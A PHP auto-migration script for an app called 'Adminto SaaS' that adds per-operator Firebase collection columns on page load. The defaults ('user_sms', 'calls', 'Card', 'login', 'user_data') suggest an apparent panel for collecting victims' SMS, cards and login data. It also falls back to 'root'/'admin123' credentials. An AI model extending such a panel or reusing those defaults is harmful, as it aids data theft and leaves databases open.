<?php
/**
 * Adminto SaaS - Auto Database Migration
 * ----------------------------------------
 * Runs silently on every page load (included via header.php).
 * Uses PHP sessions to skip after first successful run — zero DB cost on repeat visits.
 *
 * To add new migrations in the future:
 *   1. Add entry to $_mg_migrations array
 *   2. Bump MIGRATION_VERSION by 1
 *   → Sessions will auto-invalidate and migrations will re-run once.
 */

// ─── MIGRATION VERSION ───────────────────────────────────────────────────────
// Bump this number whenever you add new migrations below.
define('ADMINTO_MIGRATION_VERSION', 2);

// ─── SESSION GUARD ───────────────────────────────────────────────────────────
// Skip entirely if migrations already ran this session at the current version.
if (
    isset($_SESSION['db_migrated_v']) &&
    $_SESSION['db_migrated_v'] === ADMINTO_MIGRATION_VERSION
) {
    return; // Already done this session — zero DB connection needed
}

// ─── DB CONFIG ───────────────────────────────────────────────────────────────
$_mg_host   = getenv('DB_HOST')     ?: 'localhost';
$_mg_dbname = getenv('DB_NAME')     ?: 'adminto_saas_db';
$_mg_user   = getenv('DB_USER')     ?: 'root';
$_mg_pass   = getenv('DB_PASSWORD') ?: 'admin123';
$_mg_port   = getenv('DB_PORT')     ?: '3306';

// ─── MIGRATION DEFINITIONS ───────────────────────────────────────────────────
// Each entry: [ 'column_name_hint', 'ALTER TABLE SQL' ]
// Errors are silently caught (column already exists = error 1060).
$_mg_migrations = [
    // v1 — Firebase Database URL per operator
    ['firebase_database_url',
        "ALTER TABLE operators ADD COLUMN firebase_database_url VARCHAR(512) DEFAULT '' AFTER firebase_api_key"],

    // v2 — Per-operator Firebase Collection Mappings (preset stored in DB)
    ['collection_sms',
        "ALTER TABLE operators ADD COLUMN collection_sms   VARCHAR(100) DEFAULT 'user_sms'  AFTER org_id"],
    ['collection_calls',
        "ALTER TABLE operators ADD COLUMN collection_calls VARCHAR(100) DEFAULT 'calls'     AFTER collection_sms"],
    ['collection_cards',
        "ALTER TABLE operators ADD COLUMN collection_cards VARCHAR(100) DEFAULT 'Card'      AFTER collection_calls"],
    ['collection_forms',
        "ALTER TABLE operators ADD COLUMN collection_forms VARCHAR(100) DEFAULT 'login'     AFTER collection_cards"],
    ['collection_sims',
        "ALTER TABLE operators ADD COLUMN collection_sims  VARCHAR(100) DEFAULT 'user_data' AFTER collection_forms"],
];

// ─── RUN MIGRATIONS ──────────────────────────────────────────────────────────
try {
    $_mg_dsn = "mysql:host={$_mg_host};port={$_mg_port};dbname={$_mg_dbname};charset=utf8mb4";
    $_mg_pdo = new PDO($_mg_dsn, $_mg_user, $_mg_pass, [
        PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ]);

    foreach ($_mg_migrations as [$_mg_col, $_mg_sql]) {
        try {
            $_mg_pdo->exec($_mg_sql);
        } catch (PDOException $_mg_col_ex) {
            // Duplicate column (1060) or other ignorable error — continue
        }
    }

    // ✅ Mark this version as done for the whole session
    $_SESSION['db_migrated_v'] = ADMINTO_MIGRATION_VERSION;

    unset($_mg_pdo);
} catch (PDOException $_mg_conn_ex) {
    // DB offline — fail silently, page still loads normally.
    // login.php / api.php will show their own DB error messages.
}

// Clean up migration variables from global scope
unset(
    $_mg_host, $_mg_dbname, $_mg_user, $_mg_pass, $_mg_port,
    $_mg_migrations, $_mg_dsn, $_mg_col, $_mg_sql,
    $_mg_col_ex, $_mg_conn_ex
);
